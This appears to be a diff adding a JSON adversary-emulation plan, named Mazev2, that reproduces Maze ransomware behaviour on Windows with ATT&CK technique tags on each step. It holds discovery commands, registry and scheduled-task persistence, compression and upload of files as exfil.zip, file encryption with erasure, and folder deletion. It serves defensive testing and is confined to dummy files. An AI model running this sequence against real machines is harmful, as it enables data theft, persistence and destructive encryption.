@@ -1,0 +1,439 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "Mazev2",
+        "display_name": "Mazev2",
+        "name": "Mazev2",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": {
+                    "--cp": "127.0.0.1:443",
+                    "--secure": true
+                },
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "request": "--load run",
+                "rtags": [
+                    "att&ck-technique:T1071",
+                    "att&ck-technique:T1078",
+                    "att&ck-technique:T1078.003"
+                ],
+                "type": "message"
+            },
+            "2": {
+                "module": "run",
+                "request": "whoami",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1033",
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "3": {
+                "module": "loader",
+                "request": "--load sysinfo",
+                "type": "message"
+            },
+            "4": {
+                "module": "sysinfo",
+                "request": "",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1082"
+                ],
+                "type": "message"
+            },
+            "5": {
+                "module": "loader",
+                "request": "--load processes",
+                "type": "message"
+            },
+            "6": {
+                "module": "processes",
+                "request": "",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1057"
+                ],
+                "type": "message"
+            },
+            "7": {
+                "module": "loader",
+                "request": "--load services",
+                "type": "message"
+            },
+            "8": {
+                "module": "services",
+                "request": "--all",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1007"
+                ],
+                "type": "message"
+            },
+            "9": {
+                "module": "loader",
+                "request": "--load arp",
+                "type": "message"
+            },
+            "10": {
+                "module": "arp",
+                "request": "",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1016"
+                ],
+                "type": "message"
+            },
+            "11": {
+                "module": "run",
+                "request": "cmd /c dir %USERPROFILE%\\Documents",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1083"
+                ],
+                "type": "message"
+            },
+            "12": {
+                "module": "loader",
+                "request": "--load upsh",
+                "type": "message"
+            },
+            "13": {
+                "module": "upsh",
+                "request": "--cmd Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct",
+                "rtags": [
+                    "att&ck-technique:T1518.001"
+                ],
+                "type": "message"
+            },
+            "14": {
+                "module": "upsh",
+                "request": "--cmd Get-DnsClientServerAddress",
+                "rtags": [
+                    "att&ck-technique:T1016"
+                ],
+                "type": "message"
+            },
+            "15": {
+                "module": "run",
+                "request": "net use",
+                "rtags": [
+                    "att&ck-technique:T1016"
+                ],
+                "type": "message"
+            },
+            "16": {
+                "module": "run",
+                "request": "cmd /c dir C:\\",
+                "rtags": [
+                    "att&ck-technique:T1083"
+                ],
+                "type": "message"
+            },
+            "17": {
+                "module": "run",
+                "request": "cmd /c REG ADD HKEY_CURRENT_USER\\Software\\ExampleRegKey /v Example /d \"Example Data\" /f",
+                "rtags": [
+                    "att&ck-technique:T1547.001",
+                    "att&ck-technique:T1112"
+                ],
+                "type": "message"
+            },
+            "18": {
+                "module": "run",
+                "request": "cmd /c REG QUERY HKEY_CURRENT_USER\\Software\\ExampleRegKey",
+                "rtags": [
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "19": {
+                "module": "run",
+                "request": "cmd /c SCHTASKS /CREATE /SC DAILY /TN \"MyTasks\\Example Task\" /TR \"C:\\example_service.exe\" /ST 11:00 /F",
+                "rtags": [
+                    "att&ck-technique:T1053",
+                    "att&ck-technique:T1053.005"
+                ],
+                "type": "message"
+            },
+            "20": {
+                "module": "run",
+                "request": "cmd /c SCHTASKS /QUERY /TN \"MyTasks\\Example Task\"",
+                "rtags": [
+                    "att&ck-technique:T1053",
+                    "att&ck-technique:T1053.005"
+                ],
+                "type": "message"
+            },
+            "21": {
+                "module": "run",
+                "request": "cmd /c hostname",
+                "rtags": [
+                    "att&ck-technique:T1082"
+                ],
+                "type": "message"
+            },
+            "22": {
+                "module": "upsh",
+                "request": "--cmd \"Invoke-Command -ScriptBlock {Get-Date}\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1124",
+                    "att&ck-technique:T1059.001"
+                ],
+                "type": "message"
+            },
+            "23": {
+                "module": "loader",
+                "request": "--load crypt",
+                "type": "message"
+            },
+            "24": {
+                "module": "loader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "25": {
+                "module": "loader",
+                "request": "--load file",
+                "type": "message"
+            },
+            "26": {
+                "module": "loader",
+                "request": "--load search",
+                "type": "message"
+            },
+            "27": {
+                "module": "loader",
+                "request": "--load uploader",
+                "type": "message"
+            },
+            "28": {
+                "module": "run",
+                "request": "cmd /c mkdir \"%USERPROFILE%\\Desktop\\x_maze_folder\"",
+                "rtags": [
+                    "att&ck-technique:T1059"
+                ],
+                "type": "message"
+            },
+            "29": {
+                "module": "run",
+                "request": "cmd /c mkdir \"%USERPROFILE%\\Desktop\\x_maze_folder\\x_malicious_files\"",
+                "rtags": [
+                    "att&ck-technique:T1059"
+                ],
+                "type": "message"
+            },
+            "30": {
+                "module": "downloader",
+                "request": "--src \"VFS:/shared/Maze/DECRYPT-FILES.txt\" --dest \"%USERPROFILE%\\Desktop\\x_maze_folder\\x_malicious_files\\DECRYPT-FILES.txt\"",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "31": {
+                "module": "downloader",
+                "request": "--src \"VFS:/shared/Maze/dir_recon.ps1\" --dest \"%USERPROFILE%\\Desktop\\x_maze_folder\\x_malicious_files\\dir_recon.ps1\"",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "32": {
+                "module": "downloader",
+                "request": "--src \"VFS:/shared/Maze/dist.bat\" --dest \"%USERPROFILE%\\Desktop\\x_maze_folder\\x_malicious_files\\dist.bat\"",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "33": {
+                "module": "downloader",
+                "request": "--src \"VFS:/shared/Maze/dist2.bat\" --dest \"%USERPROFILE%\\Desktop\\x_maze_folder\\x_malicious_files\\dist2.bat\"",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "34": {
+                "module": "downloader",
+                "request": "--src \"VFS:/shared/Maze/ftp_download.ps1\" --dest \"%USERPROFILE%\\Desktop\\x_maze_folder\\x_malicious_files\\ftp_download.ps1\"",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "35": {
+                "module": "downloader",
+                "request": "--src \"VFS:/shared/Maze/ftp_upload.ps1\" --dest \"%USERPROFILE%\\Desktop\\x_maze_folder\\x_malicious_files\\ftp_upload.ps1\"",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "36": {
+                "module": "downloader",
+                "request": "--src \"VFS:/shared/Maze/mal_script.ps1\" --dest \"%USERPROFILE%\\Desktop\\x_maze_folder\\x_malicious_files\\mal_script.ps1\"",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "37": {
+                "module": "downloader",
+                "request": "--src \"VFS:/shared/Maze/mazedesktop.png\" --dest \"%USERPROFILE%\\Desktop\\x_maze_folder\\x_malicious_files\\mazedesktop.png\"",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "38": {
+                "module": "downloader",
+                "request": "--src \"VFS:/shared/Maze/windows.bat\" --dest \"%USERPROFILE%\\Desktop\\x_maze_folder\\x_malicious_files\\windows.bat\"",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "39": {
+                "module": "run",
+                "request": "cmd /c mkdir \"%USERPROFILE%\\Desktop\\x_maze_folder\\x_target_files\"",
+                "rtags": [
+                    "att&ck-technique:T1059"
+                ],
+                "type": "message"
+            },
+            "40": {
+                "module": "file",
+                "request": "--create --path \"%USERPROFILE%\\Desktop\\x_maze_folder\\x_target_files\\target_file.xls\" --size 5MB --count 10 --random",
+                "rtags": [
+                    "att&ck-technique:T1078"
+                ],
+                "type": "message"
+            },
+            "41": {
+                "module": "search",
+                "request": "--directory \"%USERPROFILE%\" --filename \"target_file.xls\" --recurse",
+                "rtags": [
+                    "att&ck-technique:T1083"
+                ],
+                "type": "message"
+            },
+            "42": {
+                "module": "upsh",
+                "request": "--cmd \"Compress-Archive -Path $env:userprofile\\Desktop\\x_maze_folder\\x_target_files -CompressionLevel Optimal -Destination $env:userprofile\\Desktop\\x_maze_folder\\exfil.zip\"",
+                "rtags": [
+                    "att&ck-technique:T1560.002",
+                    "att&ck-technique:T1074.001"
+                ],
+                "type": "message"
+            },
+            "43": {
+                "module": "uploader",
+                "request": "--remotepath \"%USERPROFILE%\\Desktop\\x_maze_folder\\exfil.zip\"",
+                "rtags": [
+                    "att&ck-technique:T1041",
+                    "att&ck-technique:T1005"
+                ],
+                "type": "message"
+            },
+            "44": {
+                "module": "crypt",
+                "request": "--target \"%USERPROFILE%\\Desktop\\x_maze_folder\\x_target_files\\\" --encrypt --password \"h3ll0w0rld\" --erase",
+                "rtags": [
+                    "att&ck-technique:T1486"
+                ],
+                "type": "message"
+            },
+            "45": {
+                "module": "run",
+                "request": "cmd /c echo %userprofile%",
+                "rtags": [
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1087",
+                    "att&ck-technique:T1083"
+                ],
+                "type": "message"
+            },
+            "46": {
+                "module": "upsh",
+                "request": "--script $(45).response[\"result\"].strip(\" \").strip(\"\\r\\n\").suffix(\"\\\\Desktop\\\\x_maze_folder\\\\x_malicious_files\\\\mal_script.ps1\")",
+                "rtags": [
+                    "att&ck-technique:T1059.001"
+                ],
+                "type": "message"
+            },
+            "47": {
+                "module": "upsh",
+                "request": "--cmd \"$myscriptblock={Set-ItemProperty -path 'HKCU:\\Control Panel\\Desktop\\' -name wallpaper -value \"%USERPROFILE%\\Desktop\\x_maze_folder\\x_malicious_files\\mazedesktop.png\"; rundll32.exe user32.dll, UpdatePerUserSystemParameters;}; Invoke-Command -ScriptBlock $myscriptblock;\"",
+                "rtags": [
+                    "att&ck-technique:T1059.001"
+                ],
+                "type": "message"
+            },
+            "48": {
+                "time": 10,
+                "type": "delay"
+            },
+            "49": {
+                "module": "run",
+                "request": "cmd /c REG DELETE HKEY_CURRENT_USER\\Software\\ExampleRegKey /f",
+                "rtags": [
+                    "att&ck-technique:T1547.001",
+                    "att&ck-technique:T1112"
+                ],
+                "type": "message"
+            },
+            "50": {
+                "module": "run",
+                "request": "cmd /c SCHTASKS /DELETE /TN \"MyTasks\\Example Task\" /F",
+                "rtags": [
+                    "att&ck-technique:T1053",
+                    "att&ck-technique:T1053.005"
+                ],
+                "type": "message"
+            },
+            "51": {
+                "module": "run",
+                "request": "cmd /c rmdir /Q /S \"\"%USERPROFILE%\\Desktop\\x_maze_folder\"\"",
+                "rtags": [
+                    "att&ck-technique:T1485"
+                ],
+                "type": "message"
+            },
+            "52": {
+                "module": "controller",
+                "request": "--shutdown",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0011",
+                    "att&ck-technique:T1219"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
